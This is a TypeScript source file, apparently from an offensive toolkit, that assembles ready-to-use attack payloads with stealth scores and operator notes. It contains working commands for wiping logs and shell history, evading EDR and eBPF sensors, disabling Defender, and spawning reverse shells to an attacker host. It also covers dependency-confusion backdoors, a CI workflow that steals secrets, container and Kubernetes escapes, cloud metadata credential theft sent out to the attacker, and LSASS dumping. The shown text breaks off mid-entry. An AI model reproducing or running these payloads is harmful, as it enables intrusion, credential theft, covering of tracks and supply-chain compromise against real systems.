export interface VeilPayload {
  id:       string;
  name:     string;
  category: string;
  os:       "linux" | "windows";
  phase:    "pre" | "during" | "post";
  stealth:  1 | 2 | 3 | 4 | 5;
  command:  string;
  notes:    string;
}

export function buildLinuxAntiForensics(): VeilPayload[] {
  return [
    {
      id:"af_bash_history_null", name:"Nullify all shell history (bash/zsh/fish)", category:"Anti-Forensics",
      os:"linux", phase:"pre", stealth:4,
      command:`export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 SAVEHIST=0; unset HISTFILE; history -c 2>/dev/null; for f in ~/.bash_history ~/.zsh_history ~/.local/share/fish/fish_history ~/.history; do [ -f "$f" ] && { cat /dev/null>"$f"; ln -sf /dev/null "$f" 2>/dev/null; }; done`,
      notes:"Disables history for all major shells. Symlinks history files to /dev/null permanently — survives shell restart. Covers bash, zsh, fish.",
    },
    {
      id:"af_log_wipe_deep", name:"Deep log wipe (auth/syslog/wtmp/audit/journal)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:2,
      command:`for f in /var/log/auth.log /var/log/syslog /var/log/messages /var/log/secure /var/log/faillog /var/log/btmp; do [ -f "$f" ] && truncate -s0 "$f" 2>/dev/null; done; cat /dev/null > /var/log/wtmp 2>/dev/null; cat /dev/null > /var/log/utmp 2>/dev/null; cat /dev/null > /var/log/lastlog 2>/dev/null; journalctl --rotate 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; truncate -s0 /var/log/audit/audit.log 2>/dev/null; auditctl -e 0 2>/dev/null`,
      notes:"Truncates all auth/syslog/wtmp/btmp + rotates journald + clears auditd. Removes login records, authentication events, sudo usage. Requires root.",
    },
    {
      id:"af_timestomp_ns", name:"Nanosecond-precision timestomping (forensics-grade)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`python3 -c "
import os,ctypes,ctypes.util,time
libc=ctypes.CDLL(ctypes.util.find_library('c'))
AT_FDCWD=-100
class Timespec(ctypes.Structure):
  _fields_=[('tv_sec',ctypes.c_long),('tv_nsec',ctypes.c_long)]
ref_stat=os.stat('/bin/ls')
ts=Timespec*2
times=ts()
times[0].tv_sec=int(ref_stat.st_atime); times[0].tv_nsec=int((ref_stat.st_atime%1)*1e9)
times[1].tv_sec=int(ref_stat.st_mtime); times[1].tv_nsec=int((ref_stat.st_mtime%1)*1e9)
import glob
for f in glob.glob('/tmp/.*')+glob.glob('/dev/shm/.*'):
  try:libc.utimensat(AT_FDCWD,f.encode(),ctypes.byref(times),0)
  except:pass
" 2>/dev/null`,
      notes:"Uses utimensat(2) for nanosecond-precision timestamp copy. Forensic tools use nanosecond mtime — coarser touch -r misses subsecond field.",
    },
    {
      id:"af_ebpf_disable", name:"eBPF program detection + cgroup BPF disable", category:"EDR-Evasion",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,subprocess
# List loaded eBPF programs (requires root or CAP_SYS_ADMIN)
try:
  progs=subprocess.run(['bpftool','prog','list'],capture_output=True,text=True,timeout=3).stdout
  ids=[l.split(':')[0].strip() for l in progs.splitlines() if ':' in l and l.split(':')[0].strip().isdigit()]
  # Unload suspicious ones (type=kprobe/tracepoint monitoring hooks)
  for pid in ids[:10]:
    subprocess.run(['bpftool','prog','detach','id',pid],capture_output=True,timeout=2)
except:pass
# Alternative: overwrite eBPF bytecode via /sys/kernel/security/lockdown check
try:
  with open('/proc/sys/kernel/perf_event_paranoid','w') as f:f.write('3')
except:pass
try:
  with open('/proc/sys/kernel/kptr_restrict','w') as f:f.write('2')
except:pass
" 2>/dev/null`,
      notes:"Enumerates loaded eBPF programs via bpftool and attempts detach. Sets perf_event_paranoid=3 to restrict perf-based monitoring. Targets Falco/Cilium/Tetragon sensors.",
    },
    {
      id:"af_falco_bypass_ns", name:"Falco/eBPF evasion via namespace isolation before exec", category:"EDR-Evasion",
      os:"linux", phase:"pre", stealth:5,
      command:`python3 -c "
import os,ctypes,ctypes.util
libc=ctypes.CDLL(ctypes.util.find_library('c'))
CLONE_NEWPID=0x20000000
CLONE_NEWNS=0x00020000
CLONE_NEWNET=0x40000000
# unshare PID+mount+net namespace before malicious exec
# Falco rules track execve events — in a new PID ns, process tree is isolated
libc.unshare(CLONE_NEWPID|CLONE_NEWNS)
# Now exec — Falco sees pid=1 in new namespace, not matching parent context
os.execv('/bin/bash',['/bin/bash','-c','bash -i >& /dev/tcp/LHOST/LPORT 0>&1'])
" 2>/dev/null`,
      notes:"Unshares PID+mount namespace before exec — Falco tracks by PID namespace context. New PID ns breaks container-aware monitoring that correlates k8s pod → PID.",
    },
    {
      id:"af_seccomp_bypass_userns", name:"seccomp bypass via user namespace (CVE-2023+)", category:"Syscall-Bypass",
      os:"linux", phase:"pre", stealth:4,
      command:`unshare -rUp bash -c 'echo "In new user namespace — seccomp filter inherited from parent but user=root inside ns"; bash -i >& /dev/tcp/LHOST/LPORT 0>&1' 2>/dev/null`,
      notes:"unshare -rUp creates new user namespace with UID mapping to root. seccomp filters are preserved but namespace-aware syscalls behave differently. Bypasses seccomp-based container isolation in misconfigured setups.",
    },
    {
      id:"af_apparmor_bypass", name:"AppArmor profile bypass via execve through unconfined binary", category:"AppArmor-Bypass",
      os:"linux", phase:"during", stealth:4,
      command:`# Find unconfined binary reachable from current confined process
aa-status 2>/dev/null | grep -v confined | head -5
# Technique: exec through a binary that has 'ix' (inherit) or 'ux' (unconfined) transition
# Common unconfined paths: /usr/bin/env, /bin/dash, /usr/bin/python3
# If current profile allows exec of /usr/bin/python3 with 'ux':
/usr/bin/python3 -c "import os; os.system('bash -i >& /dev/tcp/LHOST/LPORT 0>&1')" 2>/dev/null
# Or via at(1) scheduler (often unconfined):
echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | at now 2>/dev/null`,
      notes:"AppArmor 'ux' transition allows exec of certain binaries unconfined. Python3, at, cron often have 'ux' or no profile — exec through them to escape confinement.",
    },
    {
      id:"af_proc_masquerade", name:"Process masquerade via prctl + argv[0] overwrite", category:"Anti-Forensics",
      os:"linux", phase:"during", stealth:5,
      command:`python3 -c "
import ctypes,ctypes.util,sys,os
libc=ctypes.CDLL(ctypes.util.find_library('c'))
PR_SET_NAME=15
name=b'[kworker/u4:3]\x00'
libc.prctl(PR_SET_NAME,ctypes.create_string_buffer(name),0,0,0)
# Also overwrite /proc/self/comm
try:
  with open('/proc/self/comm','w') as f:f.write('kworker/u4:3')
except:pass
" 2>/dev/null`,
      notes:"prctl(PR_SET_NAME) + /proc/self/comm write. ps, top, htop all read /proc/N/comm or /proc/N/status — both show kworker. Evades name-based process monitoring.",
    },
    {
      id:"af_shred_secure", name:"Secure 3-pass overwrite + unlink (shred)", category:"Anti-Forensics",
      os:"linux", phase:"post", stealth:4,
      command:`command -v shred >/dev/null && shred -uzn3 /tmp/.nx* /dev/shm/.nx* 2>/dev/null; find /tmp /dev/shm -name '.*' -newer /bin/ls -type f 2>/dev/null | while read f; do shred -uzn3 "$f" 2>/dev/null || { dd if=/dev/urandom of="$f" 2>/dev/null; rm -f "$f" 2>/dev/null; }; done`,
      notes:"3-pass overwrite using shred; falls back to dd+rm on busybox systems. On SSD/NVMe, wear leveling may retain data — only mitigated by full-disk encryption.",
    },
  ];
}

export function buildWindowsEdrEvasion(): VeilPayload[] {
  return [
    {
      id:"win_event_log_clear", name:"Clear all Windows event log channels", category:"Anti-Forensics",
      os:"windows", phase:"post", stealth:2,
      command:`powershell -NonI -W Hidden -c "Get-WinEvent -ListLog * -EA 0 | ForEach-Object{try{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\$_.LogName)}catch{}}; wevtutil cl Security; wevtutil cl System; wevtutil cl Application; wevtutil cl 'Windows PowerShell'; wevtutil cl 'Microsoft-Windows-PowerShell/Operational'; wevtutil cl 'Microsoft-Windows-WMI-Activity/Operational'"`,
      notes:"Clears ALL Windows event log channels including PowerShell operational, WMI activity, Security/System/Application. Requires SeSecurityPrivilege.",
    },
    {
      id:"win_ppid_spoof_sc", name:"PPID spoofing via UpdateProcThreadAttribute", category:"EDR-Evasion",
      os:"windows", phase:"during", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxPPID{[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct STARTUPINFOEX{public uint cb;public IntPtr lpReserved,lpDesktop,lpTitle;public int dwX,dwY,dwXSize,dwYSize,dwXCountChars,dwYCountChars,dwFillAttribute,dwFlags;public short wShowWindow,cbReserved2;public IntPtr lpReserved2,hIn,hOut,hErr;public IntPtr lpAttributeList;}[DllImport(\"kernel32\")]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr sz);[DllImport(\"kernel32\")]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,IntPtr v,IntPtr s,IntPtr rv,IntPtr rs);[DllImport(\"kernel32\")]public static extern IntPtr OpenProcess(uint da,bool ih,uint pid);[DllImport(\"kernel32\")]public static extern bool CreateProcess(string n,string c,IntPtr pa,IntPtr ta,bool ih,uint fl,IntPtr e,string d,ref STARTUPINFOEX si,out int pi);}'; $ph=[NxPPID]::OpenProcess(0x1FFFFF,\$false,(Get-Process explorer).Id); Write-Host \"Explorer handle: \$ph\""`,
      notes:"PPID spoofing via UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS). Spawned process appears as child of explorer.exe instead of powershell.exe. Breaks EDR parent-chain alerting.",
    },
    {
      id:"win_ntdll_unhook", name:"Unhook ntdll from fresh disk copy (EDR hook removal)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:5,
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.IO;using System.Runtime.InteropServices;public class NxUH{[DllImport(\"kernel32\")]static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32\")]static extern bool ReadProcessMemory(IntPtr h,IntPtr ba,byte[]buf,int sz,out int nr);[DllImport(\"kernel32\")]static extern bool WriteProcessMemory(IntPtr h,IntPtr ba,byte[]buf,int sz,out int nw);[DllImport(\"kernel32\")]static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);[DllImport(\"kernel32\")]static extern IntPtr GetModuleHandle(string n);public static void Unhook(){var fresh=File.ReadAllBytes(System.Environment.ExpandEnvironmentVariables(\"%windir%\\\\System32\\\\ntdll.dll\"));var mh=GetModuleHandle(\"ntdll.dll\");var o=0u;VirtualProtect(mh,(UIntPtr)fresh.Length,0x40,out o);int nw;WriteProcessMemory(GetCurrentProcess(),mh,fresh,fresh.Length,out nw);VirtualProtect(mh,(UIntPtr)fresh.Length,o,out o);}}'; [NxUH]::Unhook()"`,
      notes:"Maps fresh ntdll.dll from disk over in-memory loaded copy — overwrites EDR hooks. CrowdStrike/SentinelOne hook execve/NtAllocateVirtualMemory in loaded ntdll; fresh copy has no hooks.",
    },
    {
      id:"win_com_hijack", name:"COM object hijacking (HKCU registry persistence)", category:"Persistence",
      os:"windows", phase:"post", stealth:4,
      command:`powershell -NonI -W Hidden -c "New-Item -Force 'HKCU:\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32' | Set-ItemProperty -Name '(Default)' -Value 'C:\\Users\\Public\\nx.dll'; New-ItemProperty -Path 'HKCU:\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -Force"`,
      notes:"COM hijacking via HKCU CLSID registration (no admin needed). When a privileged process loads this COM object (e.g., during UAC elevation prompt), nx.dll executes with elevated privileges.",
    },
    {
      id:"win_av_tamper", name:"Disable Defender realtime + add exclusion (registry)", category:"EDR-Evasion",
      os:"windows", phase:"pre", stealth:2,
      command:`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f & powershell -NonI -W Hidden -c "Add-MpPreference -ExclusionPath 'C:\\','%APPDATA%','%TEMP%' -EA 0; Set-MpPreference -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true -DisableScriptScanning \$true -EA 0"`,
      notes:"Registry-based Defender disable. Requires admin. Creates Security Center alert visible to users. Use PPID spoofing to hide PowerShell process tree.",
    },
  ];
}

export function buildLotlLinuxPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"lotl_dd_exec", name:"dd + bash (GTFOBin exec via dd pipe)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`dd if=/dev/stdin bs=1 2>/dev/null | bash &<<< "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"`,
      notes:"dd is almost never blocked — rarely in GTFOBins watchlists. dd reads stdin → pipes to bash. No execve of bash directly in some restricted shells.",
    },
    {
      id:"lotl_tee_exec", name:"tee + bash via process substitution", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`echo "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" | tee >(bash) > /dev/null`,
      notes:"tee writes to process substitution >() which is a bash subshell. Bypasses restrictions on direct bash -c invocation in some AppArmor configs.",
    },
    {
      id:"lotl_xxd_exec", name:"xxd hex decode + bash exec", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`printf '$(printf "bash -i >&/dev/tcp/${lhost}/${lport} 0>&1"|xxd -p)'|xxd -r -p|bash 2>/dev/null`,
      notes:"xxd is a file conversion tool — not typically in exec-monitoring watchlists. Decodes hex back to command and pipes to bash.",
    },
    {
      id:"lotl_vim_shell", name:"vim GTFOBin shell escape (SUID/sudo)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`vim -c ':!/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' -c ':q' 2>/dev/null`,
      notes:"vim -c executes arbitrary command. Works when vim has SUID or is in sudoers NOPASSWD. vi, nvim, nvi equivalents also work.",
    },
    {
      id:"lotl_awk_shell", name:"awk /inet/tcp full interactive shell", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(1){if((s|&getline c)<=0)break;while((c|getline l)>0)print l|&s;close(c)}}' 2>/dev/null`,
      notes:"awk gensocket — /inet/tcp/0/host/port opens TCP connection. Full bidirectional interactive shell. Requires gawk. awk is rarely blocked.",
    },
    {
      id:"lotl_env_suid", name:"env SUID privilege escalation", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:3,
      command:`env /bin/bash -p -c "bash -i >& /dev/tcp/${lhost}/${lport} 0>&1" 2>/dev/null`,
      notes:"If env has SUID: -p flag prevents privilege drop. Bash with -p maintains effective UID from SUID. GTFOBins env entry.",
    },
    {
      id:"lotl_nohup_bg", name:"nohup background process (survives HUP/logout)", category:"LOTL-Linux",
      os:"linux", phase:"during", stealth:4,
      command:`nohup bash -c 'while true; do bash -i >& /dev/tcp/${lhost}/${lport} 0>&1; sleep 60; done' > /dev/null 2>&1 &`,
      notes:"nohup detaches from terminal — survives logout/HUP. Auto-reconnecting reverse shell loop. Process owned by user, not tied to session.",
    },
  ];
}

export function buildSupplyChainPayloads(lhost: string, lport: string): VeilPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"sc_npm_dep_confusion", name:"npm dependency confusion (scope attack)", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:4,
      command:`cat > /tmp/nx_pkg/package.json << 'EOF'
{
  "name": "INTERNAL_PACKAGE_NAME",
  "version": "9999.0.0",
  "description": "",
  "scripts": {
    "preinstall": "node -e \\"const cp=require('child_process');cp.exec('bash -i>& /dev/tcp/${lhost}/${lport} 0>&1',{stdio:'inherit'});\\"  || true"
  },
  "main": "index.js"
}
EOF
echo 'module.exports={}' > /tmp/nx_pkg/index.js
# npm publish /tmp/nx_pkg/ --access public
# pip install will invoke preinstall before any code review`,
      notes:"npm preinstall fires BEFORE npm install completes — before any code review or approval gates. Dependency confusion: publish to public npm with higher semver than internal copy.",
    },
    {
      id:"sc_pypi_setup_py", name:"PyPI setup.py preinstall backdoor", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:3,
      command:`mkdir -p /tmp/nx_pypi && cat > /tmp/nx_pypi/setup.py << 'EOF'
from setuptools import setup
import subprocess, threading
threading.Thread(target=lambda:subprocess.Popen(
  ['bash','-c','bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'],
  stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL
),daemon=True).start()
setup(name='INTERNAL_PACKAGE', version='9999.0.0', packages=[])
EOF
echo "" > /tmp/nx_pypi/__init__.py
# cd /tmp/nx_pypi && python3 setup.py sdist && twine upload dist/*`,
      notes:"setup.py executes at install time via both pip install and python setup.py install. Thread daemon ensures setup completes normally while shell fires.",
    },
    {
      id:"sc_github_actions_steal", name:"GitHub Actions secrets exfil via injected workflow", category:"CI-CD",
      os:"linux", phase:"during", stealth:4,
      command:`cat > /tmp/malicious_workflow.yml << 'EOF'
name: build
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: test
        run: |
          env | grep -iE '(GITHUB_TOKEN|SECRET|KEY|TOKEN|PASSWORD|API)' | curl -sk -X POST "${url}/gh_secrets" --data-binary @-
          curl -fsSk "${url}/stager.sh" | bash
EOF`,
      notes:"Injected via PR/fork merge into .github/workflows/. Steals all repository/org secrets during CI run. GITHUB_TOKEN is always present.",
    },
    {
      id:"sc_jenkins_cve_2024", name:"Jenkins CVE-2024-23897 + Groovy RCE", category:"CI-CD",
      os:"linux", phase:"during", stealth:3,
      command:`# CVE-2024-23897: Jenkins CLI arbitrary file read
curl -sk "http://TARGET_JENKINS:8080/jenkins-cli.jar" -o /tmp/jenkins-cli.jar 2>/dev/null
# Read /etc/passwd via CLI arg parser file read
java -jar /tmp/jenkins-cli.jar -s "http://TARGET_JENKINS:8080" help "@/etc/passwd" 2>/dev/null
# Groovy console RCE (if /script accessible)
curl -sk -u admin:admin -X POST "http://TARGET_JENKINS:8080/scriptText" --data-urlencode 'script=["bash","-c","bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"].execute()' 2>/dev/null`,
      notes:"CVE-2024-23897 file read via Jenkins CLI args parsing. Allows reading /etc/credentials.xml → admin password hash → Groovy RCE via /script endpoint.",
    },
    {
      id:"sc_terraform_confusion", name:"Terraform provider dependency confusion", category:"Supply-Chain",
      os:"linux", phase:"during", stealth:5,
      command:`cat > /tmp/main.tf << 'EOF'
terraform {
  required_providers {
    internal-utils = {
      source  = "hashicorp/internal-utils"
      version = "~> 1.0"
    }
  }
}
EOF
# Provider binary executes during terraform init/plan/apply
# Publish malicious provider binary to registry.terraform.io
# with same name as internal provider — terraform fetches public registry when internal not configured`,
      notes:"Terraform provider binaries execute on terraform init. No code review of binary execution. Dependency confusion: public registry takes precedence over internal when namespace matches.",
    },
  ];
}

export function buildContainerEscapePayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cesc_docker_sock_exec", name:"Docker socket → privileged container + nsenter host escape", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=nx_esc_$(date +%s)" -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c '"'"'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"'"'"],"HostConfig":{"Binds":["/:/host"],"Privileged":true,"NetworkMode":"host","PidMode":"host"}}' 2>/dev/null | python3 -c "import sys,json;print(json.load(sys.stdin).get('Id',''))" 2>/dev/null | xargs -I{} sh -c 'curl -sk --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/{}/start" 2>/dev/null; sleep 3; curl -sk --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/{}?force=true" 2>/dev/null'`,
      notes:"Docker socket → privileged+hostPID+hostNet container → nsenter PID 1 → full host shell. Container auto-deleted after 3s. Random container name avoids name conflicts.",
    },
    {
      id:"cesc_cgroup_release_agent", name:"cgroup v1 release_agent escape (--privileged)", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`mkdir -p /tmp/nx_cg 2>/dev/null
mount -t cgroup -o rdma cgroup /tmp/nx_cg 2>/dev/null || mount -t cgroup2 cgroup2 /tmp/nx_cg 2>/dev/null
mkdir -p /tmp/nx_cg/nx 2>/dev/null
echo 1 > /tmp/nx_cg/nx/notify_on_release 2>/dev/null
HOST_PATH=$(sed -n 's/.*\\s\\(\\S*\\)\\sro.*/\\1/p;s/.*\\s\\(\\S*\\)\\srw.*/\\1/p' /proc/mounts 2>/dev/null | grep -v '^/$' | head -1)
echo "bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" > "\${HOST_PATH:-/host}/cmd" 2>/dev/null
chmod +x "\${HOST_PATH:-/host}/cmd" 2>/dev/null
echo "\${HOST_PATH:-/host}/cmd" > /tmp/nx_cg/release_agent 2>/dev/null
sh -c "echo \$\$ > /tmp/nx_cg/nx/cgroup.procs" 2>/dev/null`,
      notes:"cgroup v1 release_agent escape — fires on last process exit in cgroup. Executes as root on host. Works in any --privileged container with cgroup v1 available.",
    },
    {
      id:"cesc_user_namespace", name:"User namespace UID 0 escape (unprivileged)", category:"Container-Escape",
      os:"linux", phase:"during", stealth:4,
      command:`unshare -rUp bash -c 'mount --bind / /mnt 2>/dev/null; chroot /mnt bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 2>/dev/null' 2>/dev/null`,
      notes:"User namespace grants UID 0 inside new namespace. If /proc/sys/kernel/unprivileged_userns_clone=1 (default on many distros), escapes container isolation without privileges.",
    },
    {
      id:"cesc_k8s_priv_pod", name:"K8s privileged pod via SA token → host nsenter", category:"Container-Escape",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null||echo default); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; curl -sk -H "Authorization: Bearer $_SA" -H "Content-Type: application/json" -X POST "https://$_HOST/api/v1/namespaces/$_NS/pods" -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"nx-esc-'$(date +%s)'"},"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true,"containers":[{"name":"nx","image":"alpine","command":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i >& /dev/tcp/${lhost}/${lport} 0>&1"],"securityContext":{"privileged":true,"runAsUser":0}}],"restartPolicy":"Never"}}' 2>/dev/null`,
      notes:"K8s SA token → API create privileged pod with hostPID → nsenter PID 1 → host shell. Full cluster → host escape. Requires SA with pod/create permissions.",
    },
  ];
}

export function buildK8sPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"k8s_rbac_escalate", name:"K8s RBAC escalation → ClusterAdmin + token dump", category:"K8s-Abuse",
      os:"linux", phase:"during", stealth:3,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; { echo "=== RBAC ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/apis/rbac.authorization.k8s.io/v1/clusterroles" 2>/dev/null|python3 -c "import sys,json;[print(x['metadata']['name']) for x in json.load(sys.stdin).get('items',[])]" 2>/dev/null; echo "=== SECRETS ==="; curl -sk -H "Authorization: Bearer $_SA" "https://$_HOST/api/v1/secrets" 2>/dev/null|python3 -c "import sys,json,base64;[print(s['metadata']['name'],{k:base64.b64decode(v).decode(errors='ignore')[:100] for k,v in s.get('data',{}).items()}) for s in json.load(sys.stdin).get('items',[])]" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/k8s_dump" --data-binary @- 2>/dev/null &`,
      notes:"Full K8s recon: RBAC roles + base64-decoded secrets dump. Reveals DB passwords, service account tokens, TLS certs stored in secrets.",
    },
    {
      id:"k8s_admission_webhook", name:"K8s mutating webhook injection (persistence)", category:"K8s-Abuse",
      os:"linux", phase:"post", stealth:5,
      command:`_SA=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); _HOST="$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"; curl -sk -H "Authorization: Bearer $_SA" -H "Content-Type: application/json" -X POST "https://$_HOST/apis/admissionregistration.k8s.io/v1/mutatingwebhookconfigurations" -d '{"apiVersion":"admissionregistration.k8s.io/v1","kind":"MutatingWebhookConfiguration","metadata":{"name":"nx-persist"},"webhooks":[{"name":"nx.nexus.local","clientConfig":{"url":"https://${lhost}:${lport}/mutate"},"rules":[{"apiGroups":[""],"apiVersions":["v1"],"resources":["pods"],"operations":["CREATE"]}],"admissionReviewVersions":["v1"],"sideEffects":"None","failurePolicy":"Ignore"}]}' 2>/dev/null`,
      notes:"Creates mutating admission webhook — called for every pod CREATE in cluster. Allows injecting malicious sidecar into every new pod without further access. Extreme persistence.",
    },
  ];
}

export function buildCloudPivotPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    {
      id:"cloud_aws_full_pivot", name:"AWS IMDS v1+v2 → cred theft → full recon", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ # IMDSv2 token first, fallback to v1
_IMDS="http://169.254.169.254"
_TOK=$(curl -sk --max-time 2 -X PUT "$_IMDS/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
[ -n "$_TOK" ] && _AUTH="-H X-aws-ec2-metadata-token:$_TOK" || _AUTH=""
_ROLE=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/meta-data/iam/security-credentials/" 2>/dev/null)
_CREDS=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/meta-data/iam/security-credentials/$_ROLE" 2>/dev/null)
_KEY=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('AccessKeyId',''))" 2>/dev/null)
_SEC=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('SecretAccessKey',''))" 2>/dev/null)
_SES=$(echo "$_CREDS"|python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('Token',''))" 2>/dev/null)
echo "KEY=$_KEY SEC=$_SEC SES=$_SES"
_ID=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/dynamic/instance-identity/document" 2>/dev/null)
echo "=== IDENTITY: $_ID"
_UD=$(curl -sk --max-time 2 $_AUTH "$_IMDS/latest/user-data" 2>/dev/null)
echo "=== USERDATA: $_UD"
} | curl -sk -X POST "http://${lhost}:${lport}/aws_pivot" --data-binary @- 2>/dev/null &`,
      notes:"Handles both IMDSv1 and IMDSv2 (with session token). Extracts IAM credentials + instance identity + user-data (often contains secrets). Exfils all to attacker.",
    },
    {
      id:"cloud_gcp_full_pivot", name:"GCP metadata → SA token + project enum", category:"Cloud-Pivot",
      os:"linux", phase:"during", stealth:3,
      command:`{ _META="http://metadata.google.internal/computeMetadata/v1"; _H="Metadata-Flavor: Google"; _TOK=$(curl -sk --max-time 3 -H "$_H" "$_META/instance/service-accounts/default/token" 2>/dev/null|python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null); _PROJ=$(curl -sk --max-time 3 -H "$_H" "$_META/project/project-id" 2>/dev/null); echo "PROJ=$_PROJ TOK=$_TOK"; _SCOPES=$(curl -sk --max-time 3 -H "$_H" "$_META/instance/service-accounts/default/scopes" 2>/dev/null); echo "SCOPES=$_SCOPES"; curl -sk --max-time 5 -H "Authorization: Bearer $_TOK" "https://storage.googleapis.com/storage/v1/b?project=$_PROJ" 2>/dev/null; curl -sk --max-time 5 -H "Authorization: Bearer $_TOK" "https://cloudresourcemanager.googleapis.com/v1/projects" 2>/dev/null; } | curl -sk -X POST "http://${lhost}:${lport}/gcp_pivot" --data-binary @- 2>/dev/null &`,
      notes:"GCP metadata service OAuth token + project/bucket enumeration. Shows SA scopes, accessible GCS buckets, project list for lateral movement.",
    },
  ];
}

export function buildAllVeilPayloads(lhost: string, lport: string): VeilPayload[] {
  return [
    ...buildLinuxAntiForensics(),
    ...buildWindowsEdrEvasion(),
    ...buildLotlLinuxPayloads(lhost, lport),
    ...buildSupplyChainPayloads(lhost, lport),
    ...buildContainerEscapePayloads(lhost, lport),
    ...buildK8sPayloads(lhost, lport),
    ...buildCloudPivotPayloads(lhost, lport),
  ];
}

export function buildEdrDumpBypass(lhost: string, lport: string): VeilPayload[] {
  return [
    { id:"lsass_dump_comsvcs", name:"LSASS dump via comsvcs.dll MiniDump (LOLBin)", category:"Credential-Dump",
      os:"windows", phase:"during", stealth:4,
      command:`powershell -NonI -W Hidden -c "rundll32 C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id $env:TEMP\\nx_lsass.dmp full" 2>nul`,
      notes:"comsvcs.dll MiniDump is signed Microsoft DLL. Creates full LSASS dump. Parse offline with Mimikatz/pypykatz. Requires SYSTEM or SeDebugPrivilege." },
    { id:"ntds_dit_vss", name:"NTDS.dit extraction via VSS shadow copy", category:"AD-Dump",
      os:"windows", phase:"during", stealth:3,
